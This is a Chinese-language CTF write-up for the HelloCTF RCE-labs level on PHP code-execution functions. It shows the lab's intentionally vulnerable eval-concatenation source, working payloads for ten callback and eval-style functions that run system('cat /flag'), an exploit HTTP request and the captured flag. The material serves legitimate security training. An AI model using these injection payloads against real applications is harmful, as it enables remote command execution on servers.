---
title: "HelloCTF RCE-labs Level 2 题解：PHP 代码执行函数"
date: 2026-10-27
pinned: false
description: "HelloCTF RCE-labs 靶场 Level 2 通关记录：从 eval() 延伸到 assert 等能直接或间接执行 PHP 代码的回调函数，讲清代码执行函数家族的取舍与利用姿势。"
tags: [ctf, web, WriteUp]
categories: [web]
draft: false
cover: /hero/bg-02-s2.jpg
---


# HelloCTF RCE-labs：PHP 代码执行函数 Writeup

> 靶场地址：`http://80-efabd682-8919-44fc-812c-b9df6c7bdaf6.challenge.ctfplus.cn/`
> 出处：HelloCTF RCE-labs（探姬 / ProbiusOfficial）
> 难度：入门 | 方向：Web / RCE
> 最终 Flag：`Geesec{7e292ec7-1526-4f7c-ae0d-9dc77b829904}`

---

## 〇、题目页面完整源码

页面访问时通过 `highlight_file(__FILE__)` 直接回显，以下为完整源码（未做任何改动）：

```php
<?php
include ("get_flag.php");
global $flag;
session_start(); // 开启 session
/*
# -*- coding: utf-8 -*-
# @Author: 探姬
# @Date:   2024-08-11 14:34
# @Repo:   github.com/ProbiusOfficial/RCE-labs
# @email:  admin@hello-ctf.com
# @link:   hello-ctf.com

--- HelloCTF - RCE靶场 : PHP代码执行函数 ---

除开在一句话木马中最受欢迎用以直接执行PHP代码的 eval() 函数，PHP还有许多 回调函数 也可以直接或者间接的执行PHP代码。

在该关卡中，你将会从能够执行代码的PHP函数中抽取一个，你需要填充函数的内容来执行某些代码以获取flag（tip:flag存储在 $flag 中,当然你也可以尝试其他方法）。
*/

function hello_ctf($function, $content){
    global $flag;
    $code = $function . "(" . $content . ");";
    echo "Your Code: $code <br>";
    eval($code);
}

function get_fun(){

    $func_list = ['eval','assert','call_user_func','create_function','array_map','call_user_func_array','usort','array_filter','array_reduce','preg_replace'];

    if (!isset($_SESSION['random_func'])) {
        $_SESSION['random_func'] = $func_list[array_rand($func_list)];
    }

    $random_func = $_SESSION['random_func'];

    $url_fucn = preg_replace('/_/', '-', $_SESSION['random_func']);

    echo "获得新的函数: $random_func ，去 https://www.php.net/manual/zh/function.".$url_fucn.".php 查看函数详情。<br>";

    return $_SESSION['random_func'];
}

function start($act){

    $random_func = get_fun();

    if($act == "r"){ /* 通过发送GET ?action=r 的方式可以重置当前选中的函数 —— 或者你可以自己想办法可控它x */
        session_unset();
        session_destroy(); 
    }

    if ($act == "submit"){
        $user_content = $_POST['content']; 
        hello_ctf($random_func, $user_content);
    }
}

isset($_GET['action']) ? start($_GET['action']) : '';
highlight_file(__FILE__);
?>
```

---

## 一、题目背景与源码

打开页面，源码直接 `highlight_file` 甩在脸上（完整源码见上节），题目说明：flag 存在 `$flag` 变量中；页面会从 10 个「能执行代码的 PHP 函数」里随机抽一个，你要填的是**这个函数的完整参数列表**。

### 1.1 源码逐模块讲解

**模块一：入口与 flag 加载**

```php
include ("get_flag.php");   // 引入定义 $flag 的文件（实际是读 /flag 文件）
global $flag;               // 把 $flag 声明为全局变量，函数内部才能拿到
session_start();            // 开启 session，用来记住"本次抽中了哪个函数"
```

| 语句 | 零基础解释 |
|---|---|
| `include` | 把另一个 PHP 文件的代码原地"复制粘贴"进来执行 |
| `global $flag` | PHP 函数内默认看不见外面的变量，`global` 相当于说"我要用全局那个 $flag" |
| `session_start()` | 给每个访客发一个 `PHPSESSID` Cookie，服务器按它区分不同人的会话数据 |

**模块二：核心漏洞点 `hello_ctf()`**

```php
function hello_ctf($function, $content){
    global $flag;
    $code = $function . "(" . $content . ");";  // ← 漏洞核心
    echo "Your Code: $code <br>";               // 回显拼好的代码
    eval($code);                                // ← 把拼好的字符串当代码执行
}
```

拼接逻辑：`$function` 是随机函数名（你控制不了），`$content` 是你 POST 上来的内容（**原样**拼入，无任何过滤）。所以最终执行的是：

```php
eval("随机函数名(你填的全部内容);");
```

**关键认知**：函数名虽然随机，但你控制的是**括号里的整个参数列表**。所以本质是十道小题：「给这个函数喂什么参数，能让它执行代码」。

**模块三：随机抽函数 `get_fun()`**

```php
$func_list = ['eval','assert','call_user_func','create_function','array_map',
              'call_user_func_array','usort','array_filter','array_reduce','preg_replace'];
if (!isset($_SESSION['random_func'])) {
    $_SESSION['random_func'] = $func_list[array_rand($func_list)];  // 首次访问随机抽
}
```

| 细节 | 解释 |
|---|---|
| `array_rand()` | 从数组里随机取一个**键**（下标） |
| 存进 `$_SESSION` | 抽一次之后就不变了，刷新页面还是它 |
| `?action=r` | 销毁 session 重新抽（源码注释还皮了一句"或者你可以自己想办法可控它"） |

**模块四：路由 `start()`**

```php
if ($act == "r"){ session_unset(); session_destroy(); }   // 重抽函数
if ($act == "submit"){ hello_ctf($random_func, $_POST['content']); }  // 执行
isset($_GET['action']) ? start($_GET['action']) : '';
```

两个开关：`GET ?action=r` 重抽；`GET ?action=submit` + `POST content=xxx` 触发。**注意 action 的值必须一字不差是 `submit`**，空值/拼错都不会进 if。

---

## 二、核心概念：什么是「回调函数」和 callable

PHP 里函数名本身可以**当字符串传**：

```php
$f = "system";   // 把函数名存成字符串
$f("ls");        // 等价于 system("ls")
```

凡是有参数声明为 `callable` 的函数，都可以接收两种东西：
1. **字符串** `'system'` → PHP 会去找名为 system 的函数来调用；
2. **数组** `[$对象, '方法名']` → 调用对象方法（本题用不到）。

本题十关里除 `eval`、`assert`、`preg_replace`（/e 模式）外，**全是回调系函数**——通用打法就是把回调填成 `system`/`readfile`，把命令/路径塞进会被传给回调的数据参数里。

另一个实用替代：flag 其实是根目录文件 `/flag`，所以除了 `system('cat /flag')`，任何能传文件路径给回调的场合都可以用 **`readfile('/flag')`**（不需要 shell）。

---

## 三、逐个函数拆解：定义、原理、payload

> 环境：该靶场为 PHP 7（从报错措辞 "assumed 'cat' (this will throw an Error in a future version)" 可判断）。所有 payload 均填在 `POST content=`，请求发到 `GET ?action=submit`。

### 3.1 eval —— 语言结构（本题抽中过）

**定义与原理**

```php
eval(string $code)
```

`eval` 不是普通函数，是**语言结构**（像 `echo`、`die` 一样），作用是把字符串**当作 PHP 代码**编译执行。它就是一句话木马 `eval($_POST[cmd])` 的本体。

**关键约束**：eval 的括号里必须是**一个完整的表达式**。本题拼接后是 `eval(你的content);`，所以你的 content 必须自己构成合法表达式。

**payload 与构造对应**

| 项目 | 内容 |
|---|---|
| content | `"system('cat /flag');"` |
| 拼接结果 | `eval("system('cat /flag');");` |
| 执行链 | eval 编译字符串 `system('cat /flag');` → 执行 shell 命令 |

**参数位对应——为什么这样填**

| 函数签名参数 | payload 中对应的片段 | 对应理由 |
|---|---|---|
| `string $code` | `"system('cat /flag');"` **整体** | eval 只有这一个参数，你的 content 100% 落进 `$code`。它要求是一段**合法的 PHP 代码字符串**——所以整体必须是字符串字面量（双引号包住），分号在字符串内部才不会破坏外层语法 |

为什么整个**用双引号包起来**？如果不包，content = `system('cat /flag');` 会拼出：

```php
eval(system('cat /flag'););   // 函数参数列表里出现分号 → 语法错误！
```

包上双引号后，eval 收到的是字符串字面量，分号在字符串内部，合法。

**引号规则：外层双引号（PHP 字符串），内层单引号（shell 命令）**，两层不能混。

### 3.2 assert —— 断言（现代 PHP 上基本是坑）

**定义与原理**

```php
assert(mixed $assertion)
```

设计用途是调试断言。历史上：当 `$assertion` 是**字符串**时，PHP 会像 eval 一样把它当代码执行（这就是它曾被视为危险函数的原因）。但 PHP 5.3/7 引入配置项 `zend.assertions`：

| zend.assertions | 行为 |
|---|---|
| 1 | 编译并执行断言（开发环境默认） |
| 0 | 编译但不执行 |
| **-1** | **编译期直接剔除，assert 等于不存在（生产环境默认）** |

**payload**：`"system('cat /flag');"`（和 eval 同构）

**参数位对应——为什么这样填**

| 函数签名参数 | payload 中对应的片段 | 对应理由 |
|---|---|---|
| `mixed $assertion` | `"system('cat /flag');"` **整体** | 唯一的有效参数。设计意图是「断言条件」，但历史实现里**字符串断言会被当 PHP 代码 eval**——前提是 `zend.assertions=1` |
| `mixed $description`（可选第二参） | 不填 | 断言失败时的说明文字，与代码执行无关 |

**实测结论**：本靶场环境 `zend.assertions=-1`，**payload 静默无输出**（我在解题时第一发就栽在这）。抽到它别恋战，`?action=r` 重抽，或换 system 回调链思路。

### 3.3 call_user_func —— 把回调当函数调用

**定义与原理**

```php
call_user_func(callable $callback, mixed ...$args)
```

作用：以 `$callback($args...)` 的方式调用回调。它存在的意义是「函数名可以是运行时决定的变量」，本质上就是间接调用。

**payload 与构造对应**

| 项目 | 内容 |
|---|---|
| content | `'system','cat /flag'` |
| 拼接结果 | `call_user_func('system','cat /flag');` |
| 执行链 | 回调 = system，参数 = `cat /flag` → `system('cat /flag')` |

**参数位对应——为什么这样填**

| 函数签名参数 | payload 中对应的片段 | 对应理由 |
|---|---|---|
| `callable $callback` | `'system'` | 回调位 = **谁来执行**。传字符串函数名 `'system'`，等于把执行权交给 system |
| `mixed ...$args` | `'cat /flag'` | 数据位 = **执行时传什么参数**。可变参数按顺序展开，这里正好只有一个参数：要执行的命令 |

这是十关里最直白的一关：回调位填命令执行函数，数据位填命令。

### 3.4 create_function —— 代码注入逃逸（PHP 7.2 起废弃）

**定义与原理**

```php
create_function(string $args, string $code): string
```

作用：根据参数字符串创建一个匿名函数并返回函数名。**内部实现是拼接后调 eval**：

```php
eval('function __lambda_func(' . $args . '){' . $code . '}');
```

注意 `$code` 被直接嵌进**函数体大括号内部**。而且这个函数创建后**没人调用它**——所以函数体内的代码不会自动跑。想执行代码，就必须**逃出函数体**：让函数体提前闭合，把我们的语句留在全局位置。

**payload 与构造对应**

| 项目 | 内容 |
|---|---|
| content | `'$a','}system("cat /flag");//'` |
| 内部实际 eval 的 | `function __lambda_func($a){}system("cat /flag");//}` |

**参数位对应——为什么这样填**

| 函数签名参数 | payload 中对应的片段 | 对应理由 |
|---|---|---|
| `string $args` | `'$a'` | 生成函数的**形参列表**。本题没人调用这个函数，形参纯属占位，随便填（`''` 也行） |
| `string $code` | `'}system("cat /flag");//'` | 被嵌进**函数体大括号内部**。但函数创建后没人调用，体内代码不会跑 → 用 `}` 提前闭合函数体，把语句挤到「函数定义之后」的全局位置，随 create_function 内部那次 eval **在创建时立即执行** |

逐段拆：

| 片段 | 作用 |
|---|---|
| `}` | 提前闭合函数体（空函数） |
| `system("cat /flag");` | 落在函数体**外面**，创建函数时立即执行 |
| `//` | 注释掉尾部补回来的 `}`，避免语法错误 |

这是 CTF 经典的「闭合逃逸」手法，和 SQL 注入里补 `'` 闭合、反斜杠转义逃逸是同一种思维。

### 3.5 array_map —— 对每个元素套回调

**定义与原理**

```php
array_map(callable $callback, array $array, array ...$more)
```

作用：把回调**逐个应用到数组的每个元素**上，返回结果数组。回调每轮收到一个元素：`callback($item)`。

**payload 与构造对应**

| 项目 | 内容 |
|---|---|
| content | `'system',['cat /flag']` |
| 拼接结果 | `array_map('system',['cat /flag']);` |
| 执行链 | 对元素 `"cat /flag"` 调 `system("cat /flag")` |

**参数位对应——为什么这样填**

| 函数签名参数 | payload 中对应的片段 | 对应理由 |
|---|---|---|
| `callable $callback` | `'system'` | 第 1 参 = 回调 → **谁来执行**（array_map 的回调在最前面） |
| `array $array` | `['cat /flag']` | 第 2 参 = 待处理数组 → **元素会逐个传给回调**，命令当元素填，每次迭代就是 `system('cat /flag')` |
| `array ...$more` | 不填 | 多数组并行映射才用得上，本题无关 |

注意**参数顺序：回调在前、数组在后**（和 array_filter 相反，别背混）。

### 3.6 call_user_func_array —— 用数组传参调用回调

**定义与原理**

```php
call_user_func_array(callable $callback, array $args)
```

作用：调用回调，但**所有参数打包成一个数组**传入。等价于 `call_user_func($callback, ...$args)`。

**payload 与构造对应**

| 项目 | 内容 |
|---|---|
| content | `'system',['cat /flag']` |
| 拼接结果 | `call_user_func_array('system',['cat /flag']);` |
| 执行链 | 参数数组被展开 → `system('cat /flag')` |

**参数位对应——为什么这样填**

| 函数签名参数 | payload 中对应的片段 | 对应理由 |
|---|---|---|
| `callable $callback` | `'system'` | 回调位 = **谁来执行** |
| `array $args` | `['cat /flag']` | 全部实参**打包成一个索引数组**，调用时展开成 `system('cat /flag')`。注意和 array_map 的 `['cat /flag']` 含义不同：array_map 里它是「待处理数据」，这里它是「参数表」——只是填法恰好一样 |

和 3.3 的区别只是「参数散着给」还是「装数组里给」。

### 3.7 usort —— 用回调定义排序规则（坑：数组至少两个元素）

**定义与原理**

```php
usort(array &$array, callable $callback): bool
```

作用：用户自定义排序。回调每轮收到**两个**待比较元素 `callback($a, $b)`，返回正/负/零决定谁在前。

**payload 与构造对应**

| 项目 | 内容 |
|---|---|
| content | `['cat /flag',1],'system'` |
| 拼接结果 | `usort(['cat /flag',1],'system');` |
| 执行链 | 排序比较时调 `system('cat /flag', 1)`，第二个参数被 system 忽略 |

**参数位对应——为什么这样填**

| 函数签名参数 | payload 中对应的片段 | 对应理由 |
|---|---|---|
| `array &$array` | `['cat /flag', 1]` | 第 1 参 = 待排序数组。**排序比较的对象就是数组元素** → 元素即回调入参，命令当元素填 |
| `callable $callback` | `'system'` | 第 2 参 = 比较函数，每轮收到 `($a, $b)` 两个元素；`system` 只吃第一个参数，第二个被自然忽略 |

**为什么数组必须放两个元素**：只有 0 或 1 个元素的数组无需任何比较，**回调一次都不会被调用**。这是 usort 关最容易漏想的点。

### 3.8 array_filter —— 用回调当筛子（解题时抽中）

**定义与原理**

```php
array_filter(array $array, ?callable $callback = null, int $mode = 0)
```

作用：遍历数组，**保留回调返回真值的元素**。回调每轮收到一个元素：`callback($value)`。

**payload 与构造对应**

| 项目 | 内容 |
|---|---|
| content | `["cat /flag"],"system"` |
| 拼接结果 | `array_filter(["cat /flag"],"system");` |
| 执行链 | 对元素 `"cat /flag"` 调 `system("cat /flag")` → 命令输出回显 |

**参数位对应——为什么这样填**

| 函数签名参数 | payload 中对应的片段 | 对应理由 |
|---|---|---|
| `array $array` | `["cat /flag"]` | 第 1 参 = 待筛数组 → **元素就是回调的入参**（截图里手册签名的第一个参数），命令当元素填 |
| `?callable $callback` | `"system"` | 第 2 参 = 筛选回调，每轮收 `callback($value)`，即 `system('cat /flag')` |
| `int $mode` | 不填 | 默认 0 = 只把**值**传给回调。`ARRAY_FILTER_USE_KEY` 会改传键名、`USE_BOTH` 传值+键两个参数——本题用不到默认即可 |

和 array_map 的区别：**数组在前、回调在后**；且回调返回值被当布尔用（system 返回末行输出，无所谓，命令已经执行、输出已经 echo 了）。

### 3.9 array_reduce —— 折叠归约（第一次解出本题用的）

**定义与原理**

```php
array_reduce(array $array, callable $callback, mixed $initial = null): mixed
```

作用：把数组**折叠成一个值**（经典场景：数组求和）。迭代规则：

```php
$carry = $initial;              // 第一轮：$carry = 初始值
foreach ($array as $item) {
    $carry = $callback($carry, $item);   // 回调收到 (累计值, 当前元素)
}
```

**payload 与构造对应**

| 项目 | 内容 | 执行时变成什么 |
|---|---|---|
| content | `[1],'system','cat /flag'` | — |
| 数组 | `[1]` | 保证回调至少被调用一次 |
| 回调 | `'system'` | 每轮执行 `system($carry, $item)` |
| 初始值 | `'cat /flag'` | 第一轮 `$carry` = 它 → `system('cat /flag', 1)` |

要点：命令不在数组里，而在**第三个参数（初始值）**里——因为它才是第一轮回调的第一个入参。

**参数位对应——为什么这样填**

| 函数签名参数 | payload 中对应的片段 | 对应理由 |
|---|---|---|
| `array $array` | `[1]` | 待折叠数组。元素成为回调的 `$item`——本题用不上，放个占位 `1` 只为**保证至少迭代一轮**、回调被触发 |
| `callable $callback` | `'system'` | 每轮被调为 `callback($carry, $item)`：**第 1 个参数永远是累计值**，system 只吃它 |
| `mixed $initial` | `'cat /flag'` | 初始值成为**第一轮的 `$carry`** = 回调第一个入参 → 命令放这里 |

对比 array_filter 就能看出本质差别：array_filter 的命令放在**数组元素**里（`$value` 直达回调），array_reduce 的命令放在**初始值**里（`$carry` 直达回调）——因为两个函数把数据送进回调的**通道**不同。

### 3.10 preg_replace —— /e 模式（PHP 7 已移除，直接重抽）

**定义与原理**

```php
preg_replace(string $pattern, string $replacement, string $subject)
```

作用：正则替换。历史上，pattern 带 **`/e` 修饰符**时，匹配到的部分会用 `$replacement` **作为 PHP 代码执行**——老 CTF 经典考点。但 **PHP 7.0 起 /e 修饰符被移除**，使用会直接报错：

```
preg_replace(): The /e modifier is no longer supported, use preg_replace_callback instead
```

它又不像其他函数那样有 callable 参数（callback 版本是另一个函数 `preg_replace_callback`）。所以在本题 PHP 7 环境下**没有可行 payload**，抽到就 `?action=r` 重抽。

（仅 PHP 5 老环境才可用：`'/x/e','system("cat /flag")','x'`，留作知识储备。）

**参数位对应——为什么这样填（PHP 5 视角）**

| 函数签名参数 | payload 中对应的片段 | 对应理由 |
|---|---|---|
| `string $pattern` | `'/x/e'` | 正则模式。关键在**修饰符位**塞个 `e`，声明「匹配到就执行 replacement 里的代码」——执行入口在这个参数上 |
| `string $replacement` | `'system("cat /flag")'` | 带 /e 时它不是替换文本，而是**待执行的 PHP 代码字符串** |
| `string $subject` | `'x'` | 被扫描的字符串，只需保证能被 `/x/` 匹配一次，触发一次执行即可 |

---

## 四、函数总表（复习核心）

| 函数 | 定义（简化签名） | 原理一句话 | payload（content=） | 参数顺序口诀 | 坑 |
|---|---|---|---|---|---|
| `eval` | 语言结构，字符串当 PHP 代码执行 | 直接代码执行 | `"system('cat /flag');"` | content 必须是完整表达式 | 括号内不能有裸分号 |
| `assert` | `assert($assertion)` | 字符串参数曾当代码执行 | `"system('cat /flag');"` | 同 eval | PHP 生产环境 `zend.assertions=-1` 时是空操作 |
| `call_user_func` | `($callback, ...$args)` | 间接调用函数 | `'system','cat /flag'` | 回调在前 | 无 |
| `create_function` | `($args, $code)` | 内部 eval 拼 `function($args){$code}` | `'$a','}system("cat /flag");//'` | 参数表在前 | 要用 `}` 逃逸函数体，`//` 注释尾部；PHP 7.2 废弃 |
| `array_map` | `($callback, $array)` | 逐元素套回调 | `'system',['cat /flag']` | **回调在前** | — |
| `call_user_func_array` | `($callback, $args)` | 参数装数组里调用回调 | `'system',['cat /flag']` | 回调在前 | 参数是数组 |
| `usort` | `($array, $callback)` | 两两比较排序 | `['cat /flag',1],'system'` | **数组在前** | 数组必须 ≥2 个元素，否则回调不触发 |
| `array_filter` | `($array, $callback)` | 逐元素筛真值 | `["cat /flag"],"system"` | **数组在前** | — |
| `array_reduce` | `($array, $callback, $initial)` | 折叠：回调($carry,$item) | `[1],'system','cat /flag'` | 数组、回调、初始值 | 命令放**第三个参数**（初始值） |
| `preg_replace` | `($pattern,$replacement,$subject)` | /e 修饰符曾执行代码 | PHP 5：`'/x/e','system("cat /flag")','x'` | — | PHP 7 已移除 /e，本环境无解，重抽 |

**通用心法**：查手册找签名 → 认出 callable 参数位 → 回调填 `system`/`readfile` → 把命令/路径塞进会被传进回调的那个参数 → 引号规范（PHP 层引号包字符串，shell 层用另一种引号）。

---

## 五、我的踩坑复盘（解题实录）

| # | 我犯的错 | 现象 / 报错 | 原因分析 | 正确做法 |
|---|---|---|---|---|
| 1 | 请求行写成 `POST /?action= HTTP/1.1`（空值） | 响应里**没有 Your Code 行**，POST 内容像丢进黑洞 | 源码判断 `$act == "submit"` 是严格比较，空字符串进不了 if，`hello_ctf` 根本没被调用 | 改成 `?action=submit` |
| 2 | Cookie 头写成 `PHPSESSID=xxx; path=/` | 未直接报错，但属于脏数据 | 把服务器 `Set-Cookie` **响应头**整行抄进了**请求头**；`path` 是给浏览器看的属性，不是 Cookie 值 | 请求头只留 `Cookie: PHPSESSID=值` |
| 3 | eval 场景直接填 `system('cat/00/Flm');` | 语法错误 / 无输出 | 两层错误叠加：① 命令手滑敲成 `cat/00/Flm`——没空格且文件名错，应为 `cat /flag`；② 未加引号导致拼出 `eval(system(...););`，参数列表中出现裸分号，语法错误 | content = `"system('cat /flag');"`（双引号是 payload 一部分） |
| 4 | array_filter 场景填 `[cat /flag]` | `Warning: Use of undefined constant cat / flag` | 数组字面量里的裸单词被 PHP 当**常量名**解析；常量不存在 → 值变 null，实际执行了 `system(null)` | 数组内字符串必须带引号：`["cat /flag"],"system"` |
| 5 | （演示）assert payload `print_r($flag)` 无回显 | 静默无输出 | 生产环境 `zend.assertions=-1`，assert 在编译期被剔除，等于什么都没发生 | 认清环境再选 payload；assert 系直接跳过 |
| 6 | （认知坑）我和助手各自抓到的函数不一样 | 页面显示的函数对不上 | **函数存在 session 里**。Burp Repeater 和浏览器若用不同 PHPSESSID，就是两个独立 session、独立随机 | 全程用**同一个 Cookie**，保证抽到的函数不变；想换就 `?action=r` 主动重抽 |

**判断请求是否生效的速查**：响应里有 `Your Code:` → 代码已执行，看有无 Warning/Error 定位 payload 问题；没有 `Your Code:` → 回头查 `?action=submit` 和 Cookie。

---

## 六、完整解题流程（复现步骤）

| 步骤 | 操作 | Burp 手法 |
|---|---|---|
| 1 | 浏览器打开靶场，读源码，确认注入点是 POST content，确认两个 action 开关 | — |
| 2 | 记下页面显示的随机函数，去 php.net 查签名 | — |
| 3 | 构造 content，让 callable 位 = `system`，数据位 = 命令 | Repeater 新建请求 |
| 4 | 发 `POST /?action=submit`，**带上浏览器的 PHPSESSID**，Content-Type 用 `application/x-www-form-urlencoded` | 手抄请求头，检查 Cookie 干净 |
| 5 | 看 `Your Code` 行下方输出，拿 flag | 响应直接读 |

最终 payload（以 array_reduce 为例，解出本题）：

```
POST /?action=submit HTTP/1.1
Host: <靶场地址>
Cookie: PHPSESSID=<你的会话ID>
Content-Type: application/x-www-form-urlencoded

content=[1],'system','cat /flag'
```

flag 来源补充：`get_flag.php` 内容为 `file_get_contents("/flag")`——flag 就在根目录 `/flag` 文件里，所以 shell 的 `cat /flag` 和 PHP 的 `readfile('/flag')` 都能直达。

---

## 七、汇总表

| 项目 | 内容 |
|---|---|
| 靶场 | HelloCTF RCE-labs · PHP代码执行函数 |
| 漏洞类型 | eval 拼接注入 → 回调函数 RCE（content 参数无过滤） |
| 注入点 | `POST content`，拼入 `eval("随机函数($content);")` |
| 随机函数（本实例） | array_reduce（首次）/ eval、array_filter（复现时） |
| 核心 payload | array_reduce：`[1],'system','cat /flag'`；eval：`"system('cat /flag');"`；array_filter：`["cat /flag"],"system"` |
| 关键知识点 | callable 字符串回调、session 随机函数、eval 表达式约束、create_function 闭合逃逸、裸单词按常量解析、`zend.assertions=-1`、PHP 7 移除 `/e` |
| 最大踩坑 | action 空值不触发；数组元素忘加引号变 null |
| **Flag** | `Geesec{7e292ec7-1526-4f7c-ae0d-9dc77b829904}` |
